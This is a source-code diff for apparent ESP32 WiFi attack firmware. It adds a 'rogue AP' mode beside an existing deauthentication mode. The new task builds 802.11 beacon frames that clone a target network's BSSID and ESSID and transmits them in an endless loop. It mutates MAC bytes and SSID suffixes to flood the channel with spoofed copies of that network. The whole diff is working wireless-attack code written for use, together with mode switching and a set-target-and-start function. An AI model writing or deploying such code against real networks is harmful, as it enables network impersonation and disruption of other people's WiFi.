@@ -142,6 +142,145 @@ void wifi_set_channel(int channel)
 }
 
 /******************************************************************
+ *                             WIFI ROGUE AP
+ *****************************************************************/
+
+/**
+ * wifi_rogueap_task()
+ * 
+ * @brief: Background task that handles rogueAP.
+ **/
+
+void wifi_rogueap_task(void *parameter)
+{
+  char suffix[]="0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ";
+  int i;
+  uint16_t seqnum = 0;
+  uint8_t beacon_packet[76] = {0};
+  int beacon_packet_size = 0;
+  uint8_t fakemac[6];
+  uint32_t timestamp=0;
+
+  /* Copy target AP mac into fakemac. */
+  memcpy(fakemac, g_wifi_ctrl.p_rogueap_target->bssid, 6);
+
+  /* Set frame control + duration. */
+  beacon_packet[0] = 0x80;  /* Beacon */
+  beacon_packet[1] = 0x00;
+  beacon_packet[2] = 0x00;
+  beacon_packet[3] = 0x00;
+
+  /* Set destination mac, source mac and bssid. */
+  for (i=0; i<6; i++)
+  {
+    beacon_packet[4 + i] = 0xFF;
+    /* "randomize" MAC */
+    beacon_packet[10 + i] = fakemac[i];
+    beacon_packet[16 + i] = fakemac[i];
+  }
+  
+  /* Set beacon interval (2 bytes = 1000). */
+  beacon_packet[32] = 0xE8;
+  beacon_packet[33] = 0x03;
+
+  /* Set beacon capability (2 bytes = 0x0001). */
+  beacon_packet[34] = 0x01;
+  beacon_packet[35] = 0x00;
+
+  /* Add variable ESSID. */
+  beacon_packet[36] = 0x00;
+  beacon_packet[37] = strlen((char *)g_wifi_ctrl.p_rogueap_target->essid) + 1;
+  strncpy((char *)&beacon_packet[38], (char *)g_wifi_ctrl.p_rogueap_target->essid, 32);
+  beacon_packet_size = 38 + strlen((char *)g_wifi_ctrl.p_rogueap_target->essid) + 1;
+
+  /* Copy default supported rates. */
+  i = 38 + strlen((char *)g_wifi_ctrl.p_rogueap_target->essid);
+  beacon_packet[i++] = 0x01;
+  beacon_packet[i++] = 0x04;
+  beacon_packet[i++] = 0x82;
+  beacon_packet[i++] = 0x84;
+  beacon_packet[i++] = 0x8b;
+  beacon_packet[i++] = 0x96;
+  beacon_packet_size = i;
+
+  /* Dump packet. */
+  printf("RogueAP beacon: ");
+  for (i=0; i<beacon_packet_size; i++)
+  {
+    printf("%02x ", beacon_packet[i]);
+  }
+  printf("\r\n");
+ 
+  /* Loop and send packet. */
+  while (1)
+  {
+		beacon_packet[22] = (seqnum & 0x0f) << 4;
+		beacon_packet[23] = (seqnum & 0xff0) >> 4;
+		seqnum++;
+    
+    /* Set timestamp. */
+    timestamp++;
+    *(uint32_t *)(&beacon_packet[24]) = 0;
+    *(uint32_t *)(&beacon_packet[24+4]) = timestamp;
+    beacon_packet[38 + strlen((char *)g_wifi_ctrl.p_rogueap_target->essid)] = suffix[timestamp%36];
+
+
+    beacon_packet[15] = (beacon_packet[15]+1)&0xff;
+    beacon_packet[21] = (beacon_packet[21]+1)&0xff;
+
+		if (seqnum > 0xfff)
+			seqnum = 0;
+
+    /* Send packet */
+    esp_wifi_80211_tx_(WIFI_IF_STA, beacon_packet, beacon_packet_size, false);
+
+    /* Send packet. */
+    vTaskDelay(1);
+  }
+}
+
+/**
+ * wifi_rogueap_disable()
+ * 
+ * @brief: disable rogueap mode.
+ **/
+
+void wifi_rogueap_disable(void)
+{
+  /* Stop our scanner task. */
+  vTaskDelete(g_wifi_ctrl.current_task_handle);
+
+  /* Stop WiFi. */
+  if (g_wifi_ctrl.b_enabled)
+  {
+    wifi_disable();
+    g_wifi_ctrl.b_enabled = false;
+  }
+}
+
+
+/**
+ * wifi_rogueap_enable()
+ * 
+ * @brief: enable rogueap mode.
+ **/
+
+void wifi_rogueap_enable(void)
+{
+  ESP_ERROR_CHECK( esp_wifi_set_mode(WIFI_MODE_STA) );
+  ESP_ERROR_CHECK( esp_wifi_start() );
+  esp_wifi_set_channel(g_wifi_ctrl.p_rogueap_target->channel, 0);
+
+  /* Mark WiFi as enabled. */
+  if (!g_wifi_ctrl.b_enabled)
+    g_wifi_ctrl.b_enabled = true;
+
+  /* Start scanner. */
+  xTaskCreate(wifi_rogueap_task, "wifi_rogueap", 10000, NULL, 1, &g_wifi_ctrl.current_task_handle);
+}
+
+
+/******************************************************************
  *                             WIFI SNIFFER
  *****************************************************************/
 
@@ -618,6 +757,11 @@ void wifi_set_mode(wifi_controller_mode_t mode)
       ESP_LOGD(TAG, "disabling deauther ...");
       wifi_deauth_disable();
       break;
+
+    case WIFI_ROGUEAP:
+      ESP_LOGD(TAG, "disabling rogue AP ...");
+      wifi_rogueap_disable();
+      break;
     
     default:
       break;
@@ -639,6 +783,11 @@ void wifi_set_mode(wifi_controller_mode_t mode)
     case WIFI_DEAUTH:
       ESP_LOGD(TAG, "enabling deauther ...");
       wifi_deauth_enable();
+      break;
+
+    case WIFI_ROGUEAP:
+      ESP_LOGD(TAG, "enabling rogue AP ...");
+      wifi_rogueap_enable();
       break;
 
     default:
@@ -676,4 +825,13 @@ void wifi_deauth_target(uint8_t *p_bssid, int channel)
 
   /* Start deauth ! */
   wifi_set_mode(WIFI_DEAUTH);
+}
+
+void wifi_rogueap_set_target(wifi_ap_t *p_target)
+{
+  /* Save rogueap target. */
+  g_wifi_ctrl.p_rogueap_target = p_target;
+
+  /* Start rogueap ! */
+  wifi_set_mode(WIFI_ROGUEAP);
 }
